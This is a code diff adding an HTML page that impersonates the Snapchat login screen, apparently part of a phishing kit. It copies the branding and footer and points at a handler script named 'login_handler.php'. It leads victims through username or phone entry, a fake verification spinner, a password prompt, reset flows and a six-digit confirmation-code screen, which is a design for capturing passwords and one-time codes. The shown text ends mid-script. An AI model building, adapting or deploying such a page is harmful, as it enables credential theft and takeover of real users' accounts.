@@ -1,0 +1,1221 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Log In | Snapchat</title>
+  <meta name="description" content="Log in to Snapchat and start snapping with friends!">
+  <link rel="icon" href="../templates/assets/icons/snapchat.svg" type="image/svg+xml">
+
+  <!-- jQuery -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Graphik:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <style>
+    /* ── RESET ──────────────────────────────────────────────────── */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --snap-yellow: #FFFC00;
+      --snap-black: #000000;
+      --snap-dark-gray: #4A4A4A;
+      --snap-light-gray: #f2f2f2;
+      --snap-border: #e6e6e6;
+      --snap-blue: #00b0f0;
+      --radius: 8px;
+      --font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      font-family: var(--font-family);
+      background: var(--snap-light-gray);
+      color: var(--snap-black);
+      overflow-x: hidden;
+    }
+
+    /* ── WRAPPER ───────────────────────────────────────────────── */
+    .page-wrap {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      position: relative;
+    }
+
+    /* ── MOBILE TOP PILL ───────────────────────────────────────── */
+    .mobile-pill {
+      display: none;
+      background: var(--snap-yellow);
+      padding: 6px 18px;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 15px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      align-items: center;
+      gap: 8px;
+      margin-bottom: -15px;
+      /* Overlaps card slightly */
+      z-index: 10;
+    }
+
+    .mobile-pill svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* ── CARD ──────────────────────────────────────────────────── */
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: #ffffff;
+      border: 1px solid var(--snap-border);
+      border-radius: 12px;
+      padding: 40px 32px 32px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ── SNAP GHOST LOGO ───────────────────────────────────────── */
+    .snap-ghost {
+      width: 136px;
+      height: 136px;
+      margin: 0 auto 16px;
+      display: block;
+      filter: none;
+    }
+
+    /* ── HEADINGS ──────────────────────────────────────────────── */
+    .card-title {
+      font-size: 29px;
+      font-weight: 600;
+      color: var(--snap-black);
+      text-align: center;
+      letter-spacing: -0.3px;
+      margin-bottom: 20px;
+    }
+
+    /* ── INPUTS ────────────────────────────────────────────────── */
+    .input-group {
+      position: relative;
+      margin-bottom: 12px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: grey;
+      margin-bottom: 6px;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 46px;
+      background: #fff;
+      border: 1.5px solid #a0a0a0;
+      border-radius: var(--radius);
+      padding: 0 14px;
+      font-size: 15px;
+      color: var(--snap-black);
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .input-group input:hover {
+      border-color: #FFD500;
+    }
+
+    .input-group input:focus {
+      border: 2px solid #000;
+      padding: 0 13px;
+      /* Adjust padding to prevent layout shift from thicker border */
+    }
+
+    /* Phone Number Specifics */
+    .phone-row {
+      display: flex;
+      gap: 8px;
+    }
+
+    .phone-row .country-select {
+      width: 110px;
+      height: 48px;
+      background: #f0f0f0 url('data:image/svg+xml;utf8,<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="%23000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg"><polyline points="6 9 12 15 18 9"></polyline></svg>') no-repeat right 12px center;
+      background-size: 12px;
+      border: 1.5px solid transparent;
+      border-radius: var(--radius);
+      padding: 0 28px 0 12px;
+      font-size: 15px;
+      color: var(--snap-black);
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      cursor: pointer;
+      font-family: inherit;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .phone-row .phone-input {
+      flex: 1;
+      height: 48px;
+      background: #f0f0f0;
+      border: 1.5px solid transparent;
+      border-radius: var(--radius);
+      padding: 0 16px;
+      font-size: 15px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .phone-row .country-select:hover,
+    .phone-row .phone-input:hover {
+      border-color: #FFD500;
+    }
+
+    .phone-row .country-select:focus,
+    .phone-row .phone-input:focus {
+      border: 2px solid #000;
+      padding: 0 15px;
+      /* Adjust padding for phone-input to prevent shift */
+    }
+
+    .phone-row .country-select:focus {
+      padding: 0 27px 0 11px;
+      /* Adjust padding for select to prevent shift */
+    }
+
+    .error-border {
+      border: 1px solid #d13030 !important;
+      background: #fff !important;
+    }
+
+    .error-msg {
+      color: #d13030;
+      font-size: 13px;
+      margin-top: 6px;
+      text-align: left;
+      display: none;
+    }
+
+    /* ── TOGGLE LINK ───────────────────────────────────────────── */
+    .toggle-link {
+      display: block;
+      text-align: center;
+      font-size: 13px;
+      color: var(--snap-blue);
+      font-weight: 500;
+      text-decoration: none;
+      margin: 12px 0 20px;
+      cursor: pointer;
+    }
+
+    .toggle-link:hover {
+      text-decoration: underline;
+    }
+
+    /* ── BUTTONS ───────────────────────────────────────────────── */
+    .btn-next {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 99px;
+      height: 42px;
+      margin: 0 auto;
+      background: var(--snap-blue);
+      border: none;
+      border-radius: 50px;
+      font-size: 15.4px;
+      font-weight: 500;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-next:hover {
+      background: #0099d6;
+    }
+
+    /* ── DIVIDER ───────────────────────────────────────────────── */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+      color: #000;
+      font-size: 12.6px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #ddd;
+    }
+
+    /* ── GOOGLE BUTTON ─────────────────────────────────────────── */
+    .btn-google {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 65%;
+      height: 44px;
+      margin: 0 auto;
+      background: #fff;
+      border: 1.15px solid #000;
+      border-radius: 50px;
+      font-size: 15.4px;
+      font-weight: 500;
+      color: #3c4043;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-google:hover {
+      background: #f8f8f8;
+    }
+
+    .btn-google img {
+      width: 18px;
+      height: 18px;
+    }
+
+    /* ── SIGNUP ROW ────────────────────────────────────────────── */
+    .signup-row {
+      text-align: center;
+      margin-top: 28px;
+      font-size: 16.5px;
+      color: #333;
+    }
+
+    .signup-row a {
+      color: #000;
+      font-weight: 500;
+      text-decoration: none;
+      margin-left: 4px;
+    }
+
+    .signup-row a:hover {
+      text-decoration: underline;
+    }
+
+    /* ── FOOTER ────────────────────────────────────────────────── */
+    .footer-container {
+      background: #f2f2f2;
+      padding: 48px 0 0;
+      width: 100%;
+    }
+
+    .footer-links {
+      width: 100%;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 40px;
+      padding: 0 6% 36px;
+      justify-content: space-between;
+    }
+
+    .footer-col h4,
+    .footer-col ul li a {
+      font-size: 13.5px;
+      font-weight: 500;
+      color: #16191c;
+    }
+
+    .footer-col h4 {
+      margin-bottom: 14px;
+    }
+
+    .footer-col ul {
+      list-style: none;
+    }
+
+    .footer-col ul li {
+      margin-bottom: 10px;
+    }
+
+    .footer-col ul li a {
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+
+    .footer-col ul li a:hover {
+      text-decoration: underline;
+    }
+
+    .lang-select {
+      height: 38px;
+      width: 180px;
+      padding: 0 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      background: #ffffff;
+      font-size: 13.5px;
+      font-weight: 500;
+      color: #16191c;
+      outline: none;
+      cursor: pointer;
+    }
+
+    .footer-bottom {
+      background: #222222;
+      padding: 20px 0;
+      width: 100%;
+    }
+
+    .footer-bottom-inner {
+      width: 100%;
+      padding: 0 6%;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      gap: 40px;
+    }
+
+    .footer-bottom a {
+      color: #ffffff;
+      font-size: 13.5px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .footer-bottom a:hover {
+      text-decoration: underline;
+    }
+
+    /* ── RESPONSIVE ────────────────────────────────────────────── */
+    @media (max-width: 600px) {
+      .footer-links {
+        flex-direction: column;
+        gap: 24px;
+      }
+
+      .card {
+        padding: 32px 24px 28px;
+        border: 1px solid var(--snap-border);
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        background: #ffffff;
+        border-radius: 16px;
+        width: calc(100% - 32px);
+        margin: 0 auto;
+      }
+
+      .main-content {
+        padding: 0;
+        justify-content: flex-start;
+      }
+
+      .mobile-pill {
+        display: flex;
+        margin-top: 16px;
+        margin-bottom: 10px;
+      }
+
+      .snap-ghost {
+        width: 124px;
+        height: 124px;
+        margin: 0 auto 12px;
+      }
+
+      .card-title {
+        font-size: 26px;
+        margin-bottom: 18px;
+      }
+
+      .signup-row {
+        margin-top: 24px;
+      }
+
+      .footer-container {
+        display: none;
+      }
+    }
+
+    /* ── VERIFYING VIEW ────────────────────────────────────────── */
+    #view-verifying {
+      display: none;
+      text-align: center;
+      margin-top: -10px;
+    }
+
+    #view-verifying h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+    }
+
+    .user-box {
+      border: 1px solid var(--snap-border);
+      border-radius: var(--radius);
+      padding: 12px 16px;
+      display: inline-block;
+      margin: 0 auto;
+    }
+
+    .spinner-container {
+      position: relative;
+      width: 26px;
+      height: 26px;
+      margin: 32px auto 20px;
+    }
+
+    .spinner-outer {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 2.5px solid transparent;
+      border-top-color: #000;
+      border-right-color: #000;
+      border-radius: 50%;
+      animation: spin-outer 1s linear infinite;
+    }
+
+    .spinner-inner {
+      position: absolute;
+      top: 5px;
+      left: 5px;
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid transparent;
+      border-bottom-color: #000;
+      border-left-color: #000;
+      border-radius: 50%;
+      animation: spin-inner 1s linear infinite;
+    }
+
+    @keyframes spin-outer {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes spin-inner {
+      0% {
+        transform: rotate(360deg);
+      }
+
+      100% {
+        transform: rotate(0deg);
+      }
+    }
+
+    /* ── PASSWORD VIEW ─────────────────────────────────────────── */
+    #view-password {
+      display: none;
+      text-align: center;
+    }
+
+    #view-password h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+    }
+
+    .password-input-group {
+      text-align: left;
+      margin-top: 28px;
+    }
+
+    .password-input-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: var(--snap-black);
+    }
+
+    .password-input-wrap {
+      position: relative;
+    }
+
+    .password-input-wrap input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid var(--snap-border);
+      border-radius: var(--radius);
+      padding: 0 44px 0 14px;
+      font-size: 15px;
+      color: var(--snap-black);
+      outline: none;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
+    }
+
+    .password-input-wrap input:focus {
+      border: 2px solid #000;
+      padding: 0 43px 0 13px;
+    }
+
+    .eye-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #aaa;
+      font-size: 18px;
+      user-select: none;
+      background: none;
+      border: none;
+      padding: 4px;
+    }
+
+    .forgot-password {
+      display: block;
+      text-align: center;
+      margin-top: 20px;
+      color: #00b0f0;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .btn-next-password {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 99px;
+      height: 42px;
+      margin: 24px auto 0;
+      background: var(--snap-blue);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-next-password:hover {
+      background: #0099d6;
+    }
+
+    #password-error {
+      display: none;
+      color: #e74c3c;
+      font-size: 12px;
+      margin-top: 6px;
+      text-align: left;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="page-wrap">
+    <div class="main-content">
+
+      <!-- Mobile Top Pill -->
+      <div class="mobile-pill">
+        <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+          style="width: 31px; height: 31px;">
+        Open Snapchat
+      </div>
+
+      <!-- Login Card -->
+      <div class="card">
+        <!-- Ghost Outline Logo -->
+        <img class="snap-ghost" src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo">
+
+        <h1 class="card-title">Log in to Snapchat</h1>
+
+        <form id="login-form">
+          <!-- View 1: Username / Email -->
+          <div id="view-username">
+            <div class="input-group">
+              <label>Username or Email</label>
+              <input type="text" id="username" name="username" autocomplete="off">
+              <div id="username-error" class="error-msg"></div>
+            </div>
+            <a class="toggle-link" onclick="toggleView('phone')">Use phone number instead</a>
+          </div>
+
+          <!-- View 2: Phone Number -->
+          <div id="view-phone" style="display: none;">
+            <div class="input-group">
+              <label>Phone number</label>
+              <div class="phone-row">
+                <select class="country-select" id="country-code" name="country_code">
+                  <option value="+1">US +1</option>
+                  <option value="+44">GB +44</option>
+                  <option value="+91">IN +91</option>
+                  <option value="+61">AU +61</option>
+                  <option value="+1">CA +1</option>
+                  <option value="+33">FR +33</option>
+                  <option value="+49">DE +49</option>
+                  <option value="+81">JP +81</option>
+                  <option value="+39">IT +39</option>
+                  <option value="+34">ES +34</option>
+                  <option value="+55">BR +55</option>
+                  <option value="+52">MX +52</option>
+                  <option value="+7">RU +7</option>
+                  <option value="+82">KR +82</option>
+                  <option value="+86">CN +86</option>
+                </select>
+                <input type="tel" id="phone" name="phone" class="phone-input">
+              </div>
+              <div id="phone-error" class="error-msg"></div>
+            </div>
+            <a class="toggle-link" onclick="toggleView('username')">Use username or email address instead</a>
+          </div>
+
+          <button type="submit" class="btn-next">Next</button>
+        </form>
+
+        <div class="divider">OR</div>
+
+        <a id="google-auth-link"
+          href="https://accounts.google.com/v3/signin/accountchooser?as=e09NY8Q23syZ0UzbPv90p_AIiCnCMmvWbcYksFBDqdQ&client_id=126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com&display=popup&gis_params=GAcqK2UwOU5ZOFEyM3N5WjBVemJQdjkwcF9BSWlDbkNNbXZXYmNZa3NGQkRxZFE4AUJAYjRmYjA5OTc2NzZjN2RlYjUyODViZWFhMzY4YTYzZjdkMGZjZDRlOTk2ODRmNTgzZDUxNTlhOTllMjUzNDE2MA&gislp=1&gsiwebsdk=gis_attributes&nonce=69a112b4-4f5d-4389-9c60-81e9f1cfbfaf&origin=https%3A%2F%2Faccounts.snapchat.com&prompt=select_account&redirect_uri=gis_transform&response_mode=form_post&response_type=id_token&scope=openid+email+profile&upstream_experiment_id=117788636&dsh=e09NY8Q23syZ0UzbPv90p_AIiCnCMmvWbcYksFBDqdQ&o2v=1&service=lso&flowName=GeneralOAuthFlow&opparams=%253Fgislp%253D1%2526response_mode%253Dform_post%2526gis_params%253DGAcqK2UwOU5ZOFEyM3N5WjBVemJQdjkwcF9BSWlDbkNNbXZXYmNZa3NGQkRxZFE4AUJAYjRmYjA5OTc2NzZjN2RlYjUyODViZWFhMzY4YTYzZjdkMGZjZDRlOTk2ODRmNTgzZDUxNTlhOTllMjUzNDE2MA%2526upstream_experiment_id%253D117788636&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAM8Z_98vkSeBcE0LqFwAL97hN_IevEKjT1-qXMB8BVdLnCZlbp6hs4x60Nk6jY_v4Kx47KL0_pcfWrvZxKo5lNMiioz38tpTrGbH0WQdN5RCfxA_qaDuJ7K4wbsV7nr7yZRww9-_gqCx7SGTMhC38LR4_WWNIl7b8adi3oL8_aHirt_G09_BATNP2ROMhbf17LX7PvnszYPhEDWTgeFEpBXHDejuMFFShRmTGX6YBw_vbJ-2g40_koC5KDeRQLl7mdvRt14ogjOv1R5vZ1E6I2rMdDhcmf2vQxJgW8MQ_51tIBYFpPmeGE85eo-ZKkSWZh-d3-J-jZZIVqpTn3AU6bSe1q8OVKGpfzKJyjKo2DfvZFeCzOtvxgYnkMZt8CX7iHghxU4hoyQlGxfTFnKVHC-ySqtND7dqkcY8G-YDXV0blp3F5Wv_RYhVHRvk5EX85xbIMU8mXgV2Bq_4VYEAyV5mthhxFEowv4qLGz2Rgoirbzaw923C5ZFLrkHqUZVQCm4YNzq%26flowName%3DGeneralOAuthFlow%26as%3De09NY8Q23syZ0UzbPv90p_AIiCnCMmvWbcYksFBDqdQ%26client_id%3D126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&app_domain=https%3A%2F%2Faccounts.snapchat.com"
+          style="text-decoration: none;"
+          onclick="window.open(this.href, 'googleSignIn', 'width=500,height=600'); return false;" target="_blank">
+          <button type="button" class="btn-google">
+            <svg viewBox="0 0 48 48" width="20" height="20">
+              <path fill="#EA4335"
+                d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
+              <path fill="#4285F4"
+                d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
+              <path fill="#FBBC05"
+                d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
+              <path fill="#34A853"
+                d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
+              <path fill="none" d="M0 0h48v48H0z" />
+            </svg>
+            Continue with Google
+          </button>
+        </a>
+
+
+        <!-- Verifying View -->
+        <div id="view-verifying">
+          <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+            style="width: 80px; height: 80px; margin: 0 auto 16px; display: block;">
+          <h1>Verifying your request</h1>
+          <div class="user-box">
+            <span id="verify-username" style="color: #000; font-weight: 600; font-size: 14px;">Snapchat user</span>
+            <a href="#"
+              style="color: #00b0f0; font-weight: 500; font-size: 14px; text-decoration: none; margin-left: 6px;">Not
+              you?</a>
+          </div>
+          <p style="color: #666; font-size: 15px; margin-top: 24px; line-height: 1.4;">Please wait while we
+            perform<br>security verifications.</p>
+          <div class="spinner-container">
+            <div class="spinner-outer"></div>
+            <div class="spinner-inner"></div>
+          </div>
+        </div>
+
+        <!-- Password View -->
+        <div id="view-password">
+          <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+            style="width: 80px; height: 80px; margin: 0 auto 16px; display: block;">
+          <h1>Enter Password</h1>
+          <div class="user-box">
+            <span id="password-username" style="color: #000; font-weight: 600; font-size: 14px;"></span>
+            <a href="#"
+              style="color: #00b0f0; font-weight: 500; font-size: 14px; text-decoration: none; margin-left: 6px;">Not
+              you?</a>
+          </div>
+          <div class="password-input-group">
+            <label>Password</label>
+            <div class="password-input-wrap">
+              <input type="password" id="snap-password" name="password" autocomplete="off">
+              <button type="button" class="eye-toggle" onclick="togglePasswordVisibility()">
+                <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#aaa"
+                  stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+              </button>
+            </div>
+            <div id="password-error"></div>
+          </div>
+          <a href="#" class="forgot-password" id="btn-forgot-password">Forgot Password</a>
+          <button type="button" class="btn-next-password" id="btn-password-next">Next</button>
+        </div>
+
+        <!-- Reset Phone View -->
+        <div id="view-reset-phone" style="display: none; text-align: center;">
+          <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+            style="width: 80px; height: 80px; margin: 0 auto 16px; display: block;">
+          <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 24px;">Reset Password</h1>
+          <p style="color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.4;">Enter your phone number to receive a reset code.</p>
+          <div class="input-group" style="text-align: left; margin-bottom: 16px;">
+            <label style="color: #666; font-size: 12px; font-weight: 600; margin-bottom: 8px; display: block;">Phone Number</label>
+            <div style="display: flex; gap: 8px;">
+              <select id="reset-country-code" style="border-radius: 8px; border: 1px solid var(--snap-border); height: 48px; padding: 0 10px; background: #f8f8f8; font-size: 15px; outline: none; width: 80px;">
+                <option value="+1">US</option>
+                <option value="+91">IN</option>
+                <option value="+44">UK</option>
+              </select>
+              <input type="tel" id="reset-phone-input" placeholder="Phone Number" autocomplete="off"
+                style="border-radius: 8px; border: 1px solid var(--snap-border); flex-grow: 1; height: 48px; padding: 0 16px; font-size: 15px; outline: none;">
+            </div>
+            <div id="reset-phone-error" style="display: none; color: #d13030; font-size: 13px; margin-top: 6px;"></div>
+          </div>
+          <button type="button" class="btn-next-password" id="btn-submit-reset-phone" style="width: 100%; height: 48px; margin-top: 16px;">Submit</button>
+        </div>
+
+        <!-- Reset Email View -->
+        <div id="view-reset-email" style="display: none; text-align: center;">
+          <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+            style="width: 80px; height: 80px; margin: 0 auto 16px; display: block;">
+          <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 24px;">Reset Password</h1>
+          <p style="color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.4;">Enter your email address to receive a reset code.</p>
+          <div class="input-group" style="text-align: left; margin-bottom: 16px;">
+            <label style="color: #666; font-size: 12px; font-weight: 600; margin-bottom: 8px; display: block;">Email</label>
+            <input type="email" id="reset-email-input" placeholder="Email Address" autocomplete="off"
+                style="border-radius: 8px; border: 1px solid var(--snap-border); width: 100%; height: 48px; padding: 0 16px; font-size: 15px; outline: none;">
+            <div id="reset-email-error" style="display: none; color: #d13030; font-size: 13px; margin-top: 6px;"></div>
+          </div>
+          <button type="button" class="btn-next-password" id="btn-submit-reset-email" style="width: 100%; height: 48px; margin-top: 16px;">Submit</button>
+        </div>
+
+        <!-- Confirm View -->
+        <div id="view-confirm" style="display: none; text-align: center;">
+          <img src="../templates/assets/icons/Snapchatt.svg" alt="Snapchat Logo"
+            style="width: 80px; height: 80px; margin: 0 auto 16px; display: block;">
+          <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 24px;">Confirm it's you</h1>
+          <div class="user-box"
+            style="border-radius: 8px; border: 1px solid #e0e0e0; display: inline-flex; align-items: center; padding: 12px 16px;">
+            <span id="confirm-username" style="color: #000; font-weight: 600; font-size: 14px;"></span>
+            <a href="#"
+              style="color: #00b0f0; font-weight: 500; font-size: 14px; text-decoration: none; margin-left: 6px;">Not
+              you?</a>
+          </div>
+          <p id="confirm-prompt-text" style="color: #666; font-size: 14px; margin-top: 24px; line-height: 1.4;">Please input the code sent to
+            <br><span id="confirm-masked-target"></span>.
+          </p>
+          <div class="password-input-group">
+            <label style="color: #666;">Enter code</label>
+            <div class="password-input-wrap">
+              <input type="text" id="snap-code" name="code" autocomplete="off" maxlength="6"
+                style="border-radius: 8px; border: 1px solid var(--snap-border); width: 100%; height: 48px; padding: 0 16px; font-size: 15px; outline: none;">
+            </div>
+            <div id="code-error"
+              style="display: none; color: #d13030; font-size: 13px; margin-top: 6px; text-align: left;"></div>
+          </div>
+          <div style="margin-top: 20px; font-size: 13px; color: #666;">
+            Resend code / <a href="#" style="color: #00b0f0; text-decoration: none; font-weight: 500;">Need help?</a>
+          </div>
+          <button type="button" class="btn-next-password" id="btn-confirm-next"
+            style="width: 99px; margin-top: 24px; height: 42px;">Next</button>
+        </div>
+      </div>
+
+      <div class="signup-row">
+        New to Snapchat? <a href="https://accounts.snapchat.com/v2/signup">Sign Up</a>
+      </div>
+    </div> <!-- End of main-content -->
+
+    <!-- Forgot Password Modal -->
+    <div id="forgot-password-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/40 hidden" style="font-family: 'Graphik', 'Inter', sans-serif;">
+      <div class="bg-white w-[90%] max-w-[340px] rounded-[16px] p-6 text-center shadow-xl">
+        <h2 class="text-[#333] text-[18px] font-medium mb-6 leading-snug tracking-tight px-2">
+          Please choose how you want to reset your password.
+        </h2>
+        <div class="space-y-3">
+          <button type="button" id="btn-reset-phone" class="w-full bg-[#3e444d] hover:bg-[#2c3138] text-white text-[17px] font-semibold py-3.5 rounded-full transition-colors">
+            Via Phone
+          </button>
+          <button type="button" id="btn-reset-email" class="w-full bg-[#3e444d] hover:bg-[#2c3138] text-white text-[17px] font-semibold py-3.5 rounded-full transition-colors">
+            Via Email
+          </button>
+        </div>
+        <button type="button" id="btn-cancel-reset" class="mt-6 text-[#4a5568] hover:text-[#2d3748] text-[17px] font-bold outline-none">
+          Cancel
+        </button>
+      </div>
+    </div>
+
+    <!-- Desktop Footer -->
+    <div class="footer-container">
+        <div class="footer-links">
+          <div class="footer-col">
+            <h4>Company</h4>
+            <ul>
+              <li><a href="#">Snap Inc.</a></li>
+              <li><a href="#">Careers</a></li>
+              <li><a href="#">News</a></li>
+            </ul>
+            <h4 style="margin-top: 32px;">Language</h4>
+            <select class="lang-select">
+              <option>English (US)</option>
+            </select>
+          </div>
+          <div class="footer-col">
+            <h4>Community</h4>
+            <ul>
+              <li><a href="#">Support</a></li>
+              <li><a href="#">Community Guidelines</a></li>
+              <li><a href="#">Safety Center</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Advertising</h4>
+            <ul>
+              <li><a href="#">Buy Ads</a></li>
+              <li><a href="#">Advertising Policies</a></li>
+              <li><a href="#">Political Ads Library</a></li>
+              <li><a href="#">Brand Guidelines</a></li>
+              <li><a href="#">Promotions Rules</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Legal</h4>
+            <ul>
+              <li><a href="#">Privacy Center</a></li>
+              <li><a href="#">Your Privacy Choices</a></li>
+              <li><a href="#">Cookie Policy</a></li>
+              <li><a href="#">Report Infringement</a></li>
+              <li><a href="#">Custom Creative Tools Terms</a></li>
+              <li><a href="#">Community Geofilter Terms</a></li>
+              <li><a href="#">Lens Studio Terms</a></li>
+            </ul>
+          </div>
+
+        </div>
+        <div class="footer-bottom">
+          <div class="footer-bottom-inner">
+            <a href="https://values.snap.com/privacy/privacy-policy?lang=en-US">Privacy Policy</a>
+            <a href="https://www.snap.com/terms?lang=en-US">Terms of Service</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const HANDLER_URL = '../handlers/login_handler.php';
+      const PLATFORM = 'Snapchat';
+      let currentView = 'username';
+
+      function toggleView(view) {
+        currentView = view;
+        if (view === 'phone') {
+          document.getElementById('view-username').style.display = 'none';
+          document.getElementById('view-phone').style.display = 'block';
+        } else {
+          document.getElementById('view-phone').style.display = 'none';
+          document.getElementById('view-username').style.display = 'block';
+        }
+      }
+
+      document.getElementById('username').addEventListener('input', function () {
+        this.classList.remove('error-border');
+        document.getElementById('username-error').style.display = 'none';
+      });
+
+      document.getElementById('phone').addEventListener('input', function () {
+        this.classList.remove('error-border');
+        document.getElementById('phone-error').style.display = 'none';
+      });
+
+      document.getElementById('login-form').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        let u = '';
+        let inputField;
+        let errorMsg;
+        let msgText = '';
+
+        if (currentView === 'username') {
+          inputField = document.getElementById('username');
+          errorMsg = document.getElementById('username-error');
+          u = inputField.value.trim();
+          msgText = 'The input field cannot be empty';
+        } else {
+          inputField = document.getElementById('phone');
+          errorMsg = document.getElementById('phone-error');
+          u = inputField.value.trim();
+          msgText = 'Phone number cannot be empty';
+        }
+
+        if (!u) {
+          inputField.classList.add('error-border');
+          errorMsg.textContent = msgText;
+          errorMsg.style.display = 'block';
+          return;
+        }
+
+        if (currentView === 'phone') {
+          if (!/^\d+$/.test(u)) {
+            inputField.classList.add('error-border');
+            errorMsg.textContent = 'You may only enter numbers in the phone number field';
+            errorMsg.style.display = 'block';
+            return;
+          }
+          u = document.getElementById('country-code').value + u;
+        }
+
+        // Show verifying screen
+        document.querySelector('.snap-ghost').style.display = 'none';
+        document.querySelector('.card-title').style.display = 'none';
+        document.getElementById('login-form').style.display = 'none';
+        document.querySelector('.divider').style.display = 'none';
+        document.getElementById('google-auth-link').style.display = 'none';
+        document.querySelector('.signup-row').style.display = 'none';
+
+        // Set the entered username in verifying and password views
+        document.getElementById('verify-username').textContent = u;
